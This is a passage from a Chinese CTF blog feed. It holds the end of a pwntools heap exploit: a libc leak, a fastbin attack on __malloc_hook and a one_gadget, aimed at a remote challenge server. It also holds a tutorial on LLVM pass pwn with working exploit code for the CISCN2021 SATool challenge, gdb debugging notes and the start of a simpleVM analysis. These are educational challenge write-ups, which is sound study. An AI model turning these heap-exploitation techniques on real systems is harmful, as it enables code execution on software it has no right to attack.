class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;125.70.243.22&#x27;</span>, <span class="number">31046</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x3f3e6</span>, <span class="number">0x3f43a</span>, <span class="number">0xd5c07</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;choice:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;size:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, content=<span class="string">b&#x27;deafbeef&#x27;</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;length:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;content:&#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x18</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">libc_base = u64(r.recvuntil(<span class="string">b&#x27;\x0a&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">                [-<span class="number">7</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x39bb78</span></span><br><span class="line">log.info(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># edit(4, p64(libc_base+0x3c3b10-0x23))</span></span><br><span class="line">edit(<span class="number">4</span>, <span class="number">8</span>, p64(libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">7</span>, <span class="number">27</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x13</span>+p64(libc_base+one[<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>llvm pass pwn 入门</title>
      <link href="/2024/first-llvm-pass-pwn/"/>
      <url>/2024/first-llvm-pass-pwn/</url>
      
        <content type="html"><![CDATA[<h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h2><p>本来在前段时间学会protobuf逆向之后，想着直接又去学习llvm pass pwn，然后发现，看不懂（悲）。近段时间刚好在啃编译原理的龙书，掌握了一些概念和理论，又回到这里来，才终于能看懂并且开始复现一些简单的题目。入门学习的资料有两个，一个是<a href="https://blog.csdn.net/qq_54218833/article/details/125699994">C0lin师傅</a>的，一个是<a href="https://mp.weixin.qq.com/s/krgZmUWWpO3ajGGwYPzKdw">返璞归真师傅</a>的。</p><h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><p>其实环境安装在返璞归真师傅的文章里有讲到，我这里记录一些他没提到的问题和常用的东西。</p><p>有些远古题目比如2021年的题用的llvm-8来出的，那我们就需要安装clang-8。但是，ubuntu22下apt安装并不能安装这个版本的clang，用<code>sudo apt search clang</code>可以验证，是找不到这个版本的，但是ubuntu20下就能够成功安装。相同版本的clang在不同版本的libc下可能会有不同的表现，具体可能表现在堆布局等方面。问就是复现的时候发现有不一样的地方。</p><p>各种格式相互转换的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.c -&gt; .ll：clang -emit-llvm -S a.c -o a.ll</span><br><span class="line">.c -&gt; .bc: clang -emit-llvm -c a.c -o a.bc</span><br><span class="line">.ll -&gt; .bc: llvm-as a.ll -o a.bc</span><br><span class="line">.bc -&gt; .ll: llvm-dis a.bc -o a.ll</span><br><span class="line">.bc -&gt; .s: llc a.bc -o a.s</span><br></pre></td></tr></table></figure><p>本地验证攻击脚本的命令(以simpleVM为例)：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./opt -load ./VMPass.so -VMPass exp.ll</span><br><span class="line"></span><br><span class="line">./opt -load ./xxx.so -xxx ./exp.&#123;ll/bc&#125;</span><br></pre></td></tr></table></figure><h2 id="概念相关"><a href="#概念相关" class="headerlink" title="概念相关"></a>概念相关</h2><p>我这里记录补充一些我自己的发现或者理解。</p><p>opt是一个用来对IR代码进行优化分析的程序，它有内置的优化级别，是可以直接使用的，比如<code>opt -O3 input.ll -o output.ll</code>意思是进行O3级别的优化。这个优化的方法和方式，是可以通过加载模块来实现自定义的。题目中给出来的.so文件就是我们所说的模块。在查llvm资料的时候经常能看到的一个说法是“写一个pass”，这个所谓的pass指的就是自定义模块。pass的类型可以分成function pass、module pass、loop pass等，目前CTF中常见的是function pass，也就是对于特定函数的优化分析。一般题目会给出opt，可以用来查询llvm的版本。</p><p>自定义模块并不是opt一开始执行就加载进来了的，他是在main函数中通过一个函数加载进来的，这个函数的完整名称（包含类名）是<code>llvm::cl::ParseCommandLineOptions</code>。所以一开始断点就可以直接断在这个函数上，这个函数执行完之后，就可以断点在runOnFunction上了。</p><p>自定义模块如果要对特定单个函数（function pass）进行优化，那么一定会继承llvm原本的FunctionPass类，重写<code>runOnFunction</code>函数，他的完整名称叫<code>llvm::FPPassManager::runOnFunction</code>。签名是<code>virtual bool runOnFunction(Function &amp;F) = 0;</code>所以调用它的函数应该是个大循环，将.ll文件中的函数一个一个传进去去进行优化分析。</p><p>有些题目会把runonfunction的符号去掉，我们可以在程序的虚表，也就是.data.rel.ro段的最后一个函数找到他。</p><h2 id="CISCN2021-SATool-复现"><a href="#CISCN2021-SATool-复现" class="headerlink" title="CISCN2021 SATool(复现)"></a>CISCN2021 SATool(复现)</h2><h3 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><p>这道题C0lin师傅讲的很详细了，网上也有其他题解。尽管如此，我在复现的时候还是遇到了一些问题。这里先把问题放出来：</p><ol><li>写出来的exp.c如果转成.ll可以成功攻击，但是如果是转成exp.bc就会段错误。这个问题我还没找到原因和解决方案。</li></ol><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>调试环境是ubuntu20。解题思路不再赘述，下面的分析用一个可以打通的脚本去进行调试，并且基于已经知道了解题思路的前提。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">stealkey</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fakekey</span><span class="params">(<span class="type">int</span> d)</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">run</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line"></span><br><span class="line">    save(<span class="string">&quot;\x00&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    stealkey();</span><br><span class="line">    fakekey(<span class="number">-0x1090f2</span>);</span><br><span class="line">    run();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>clang-8 -emit-llvm -S exp.c -o exp.ll</code>首先生成.ll文件，然后<code>gdb opt</code>启动调试。第一件事先在<code>llvm::cl::ParseCommandLineOptions</code>下断点，查看backtrace可以看到执行完这个函数之后会返回到0x4b8d65，我们在这里也下一个断点。</p><p><img src="https://c-lby.top/images/first_llvm_pass_pwn/satool-%E6%A8%A1%E5%9D%97%E5%8A%A0%E8%BD%BD%E5%89%8D.png" alt="satool-模块加载前"></p><p>回到main函数之后，此时自定义模块已经被加载进程序里了，可以给runOnFunction下断点了<code>b llvm::FPPassManager::runOnFunction</code>。这时候opt就会开始逐个将我们exp中出现的函数传入runOnFunction进行处理。如果此时给<code>llvm::Value::getName</code>也断点，查看现在正在处理的函数，刚好是按照我们exp中的顺序的。也就意味这我们需要跳四次runOnFunction才会来到对backdoor的处理。</p><p>在刚刚跳断点的时候我留了个心眼，我在每次跳完之后都查看了一下bins的情况，发现在开始遍历之前0x20的tcache中只有一个chunk。但是往后每一次断点，都是七个chunk。这和exp里的七次save就对上了。</p><p><img src="https://c-lby.top/images/first_llvm_pass_pwn/satool-%E5%8F%AA%E6%9C%89%E4%B8%80%E4%B8%AAchunk.png" alt="satool-只有一个chunk"></p><p><img src="https://c-lby.top/images/first_llvm_pass_pwn/satool-%E4%B8%83%E4%B8%AAchunk.png" alt="satool-七个chunk"></p><p>顺带一提，取unsortedbin的那次save，不用写\x00也是可以的，直接留空””，或者写0，效果是一样的。</p><h3 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h3><p>题目可以打通了，然后我突发奇想，把exp改了一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">stealkey</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fakekey</span><span class="params">(<span class="type">int</span> d)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line"></span><br><span class="line">    save(<span class="string">&quot;\x00&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    stealkey();</span><br><span class="line">    fakekey(<span class="number">-0x1090f2</span>);</span><br><span class="line">    run();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把函数定义改成了声明，然后就打不通了。然后按照上面的方法断点，调试，发现只运行了一次runOnFunction然后程序就会报错了。再次调试，这次一直在单步尝试找出报错的函数，运行到getName函数的时候发现它处理的竟然是backdoor函数，也就是说那些声明并没有被传入runOnFunction。所以可以直接得出函数声明不会被当作函数处理吗？事情可能没有这么简单，我们需要进行一些验证。</p><p>首先我想到了，去查看一下.ll文件，看能不能找到一些头绪。为了防止exp运行报错，我将其缩减了一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">stealkey</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fakekey</span><span class="params">(<span class="type">int</span> d)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其对应的exp.ll长这样：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">; <span class="type">ModuleID</span> = &#x27;exq.c&#x27;</span><br><span class="line"><span class="title">source_filename</span> = <span class="string">&quot;exq.c&quot;</span></span><br><span class="line"><span class="title">target</span> datalayout = <span class="string">&quot;e-m:e-i64:64-f80:128-n8:16:32:64-S128&quot;</span></span><br><span class="line"><span class="title">target</span> triple = <span class="string">&quot;x86_64-pc-linux-gnu&quot;</span></span><br><span class="line"></span><br><span class="line">@.str = private unnamed_addr constant [<span class="number">9</span> x i8] c<span class="string">&quot;deadbeef\00&quot;</span>, align <span class="number">1</span></span><br><span class="line"></span><br><span class="line">; <span class="type">Function</span> <span class="type">Attrs</span>: noinline nounwind optnone uwtable</span><br><span class="line"><span class="title">define</span> dso_local i32 @<span class="type">B4ckDo0r</span>() #<span class="number">0</span> &#123;</span><br><span class="line">  call void @save(i8* getelementptr inbounds ([<span class="number">9</span> x i8], [<span class="number">9</span> x i8]* @.str, i32 <span class="number">0</span>, i32 <span class="number">0</span>), i8* getelementptr inbounds ([<span class="number">9</span> x i8], [<span class="number">9</span> x i8]* @.str, i32 <span class="number">0</span>, i32 <span class="number">0</span>))</span><br><span class="line">  ret i32 <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">declare</span> dso_local void @save(i8*, i8*) #<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="title">attributes</span> #<span class="number">0</span> = &#123; noinline nounwind optnone uwtable <span class="string">&quot;correctly-rounded-divide-sqrt-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;disable-tail-calls&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;less-precise-fpmad&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;min-legal-vector-width&quot;</span>=<span class="string">&quot;0&quot;</span> <span class="string">&quot;no-frame-pointer-elim&quot;</span>=<span class="string">&quot;true&quot;</span> <span class="string">&quot;no-frame-pointer-elim-non-leaf&quot;</span> <span class="string">&quot;no-infs-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-jump-tables&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-nans-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-signed-zeros-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-trapping-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;stack-protector-buffer-size&quot;</span>=<span class="string">&quot;8&quot;</span> <span class="string">&quot;target-cpu&quot;</span>=<span class="string">&quot;x86-64&quot;</span> <span class="string">&quot;target-features&quot;</span>=<span class="string">&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot;</span> <span class="string">&quot;unsafe-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;use-soft-float&quot;</span>=<span class="string">&quot;false&quot;</span> &#125;</span><br><span class="line"><span class="title">attributes</span> #<span class="number">1</span> = &#123; <span class="string">&quot;correctly-rounded-divide-sqrt-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;disable-tail-calls&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;less-precise-fpmad&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-frame-pointer-elim&quot;</span>=<span class="string">&quot;true&quot;</span> <span class="string">&quot;no-frame-pointer-elim-non-leaf&quot;</span> <span class="string">&quot;no-infs-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-nans-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-signed-zeros-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-trapping-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;stack-protector-buffer-size&quot;</span>=<span class="string">&quot;8&quot;</span> <span class="string">&quot;target-cpu&quot;</span>=<span class="string">&quot;x86-64&quot;</span> <span class="string">&quot;target-features&quot;</span>=<span class="string">&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot;</span> <span class="string">&quot;unsafe-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;use-soft-float&quot;</span>=<span class="string">&quot;false&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line">!llvm.<span class="keyword">module</span>.flags = !&#123;!<span class="number">0</span>&#125;</span><br><span class="line">!llvm.ident = !&#123;!<span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line">!<span class="number">0</span> = !&#123;i32 <span class="number">1</span>, !<span class="string">&quot;wchar_size&quot;</span>, i32 <span class="number">4</span>&#125;</span><br><span class="line">!<span class="number">1</span> = !&#123;!<span class="string">&quot;clang version 8.0.1-9 (tags/RELEASE_801/final)&quot;</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以发现，有定义的函数前的指令是define，然后函数声明的指令是declare，并且顺序被放到了后面。所以我们需要调试观察其是否会被传入到runOnFunction。结果就是，依然只执行了一次，这就意味着，declare类型的操作数确实并不会被当作函数处理。</p><p>那么，在simpleVM那道题里，exp中函数写成声明一样可以打通，那么这道题应该也有办法的。前面我们说过，在调用runOnFunction前，0x20的tcache中只有一个chunk，那是不是意味着，我们只需要save两次就够了？实践出真知。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">stealkey</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fakekey</span><span class="params">(<span class="type">int</span> d)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    <span class="comment">// save(&quot;deadbeef&quot;, &quot;deadbeef&quot;);</span></span><br><span class="line">    <span class="comment">// save(&quot;deadbeef&quot;, &quot;deadbeef&quot;);</span></span><br><span class="line">    <span class="comment">// save(&quot;deadbeef&quot;, &quot;deadbeef&quot;);</span></span><br><span class="line">    <span class="comment">// save(&quot;deadbeef&quot;, &quot;deadbeef&quot;);</span></span><br><span class="line">    <span class="comment">// save(&quot;deadbeef&quot;, &quot;deadbeef&quot;);</span></span><br><span class="line">    <span class="comment">// save(&quot;deadbeef&quot;, &quot;deadbeef&quot;);</span></span><br><span class="line"></span><br><span class="line">    save(<span class="string">&quot;\x00&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    stealkey();</span><br><span class="line">    fakekey(<span class="number">-0x1090f2</span>);</span><br><span class="line">    run();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://c-lby.top/images/first_llvm_pass_pwn/satool-%E5%A3%B0%E6%98%8E%E5%8F%AF%E6%89%93%E9%80%9A.png" alt="satool-声明可打通"></p><h2 id="RedHat2021-simpleVM-复现"><a href="#RedHat2021-simpleVM-复现" class="headerlink" title="RedHat2021 simpleVM(复现)"></a>RedHat2021 simpleVM(复现)</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>首先现在函数表里找到占据位置较大的函数，确定runOnFunction函数是sub_6830。</p><p><img src="https://c-lby.top/images/first_llvm_pass_pwn/%E7%A1%AE%E5%AE%9Arunonfunction%E4%BD%8D%E7%BD%AE.png" alt="确定runonfunction位置"></p><p>但是这个函数实在有些蹊跷，伪代码展现出来的东西逻辑非常奇怪</p><p><img src="https://c-lby.top/images/first_llvm_pass_pwn/simpleVM-runonfunction.png" alt="simpleVM-runonfunction"></p><p>但是可以大致推测一下大概意思就是如果函数名为<code>o0o0o0o0</code>就会进入到sub_6AC0，显然这个函数是核心逻辑所在。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_6AC0</span><span class="params">(__int64 a1, llvm::Function *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  llvm::BasicBlock *v3; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+38h] [rbp-18h] BYREF</span></span><br><span class="line">  _QWORD v5[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v5[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5[<span class="number">0</span>] = llvm::Function::begin(a2);<span class="comment">//将第一个基本块的迭代器赋值给v5</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = llvm::Function::end(a2);<span class="comment">//结束迭代器赋值给v4</span></span><br><span class="line">    <span class="keyword">if</span> ( (llvm::operator!=(v5, &amp;v4) &amp; <span class="number">1</span>) == <span class="number">0</span> )<span class="comment">//如果&amp;v4 v5相等，说明遍历完成，跳出循环</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">//将v3指向当前基本块</span></span><br><span class="line">    v3 = (llvm::BasicBlock *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::operator*(v5);</span><br><span class="line">    sub_6B80(a1, v3);<span class="comment">//传入v3执行函数</span></span><br><span class="line">    llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::operator++(</span><br><span class="line">      v5,</span><br><span class="line">      <span class="number">0LL</span>);<span 